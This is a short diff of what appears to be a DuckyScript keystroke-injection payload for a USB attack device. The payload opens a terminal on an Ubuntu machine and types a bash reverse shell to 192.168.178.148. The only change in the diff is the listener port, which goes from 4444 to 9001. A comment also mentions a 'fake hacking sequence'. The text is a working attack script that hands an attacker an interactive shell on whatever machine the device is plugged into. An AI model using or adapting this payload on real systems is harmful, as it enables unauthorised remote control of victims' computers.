@@ -11,7 +11,7 @@ REM --- Terminal: Reverse Shell to Ubuntu ---
 ALT F2
 STRING sh -c "xdg-terminal-exec||kgx||ptyxis||gnome-terminal"
 ENTER
-STRING bash -i >& /dev/tcp/192.168.178.148/4444 0>&1
+STRING bash -i >& /dev/tcp/192.168.178.148/9001 0>&1
 ENTER
 
 REM --- Fake hacking sequence ---
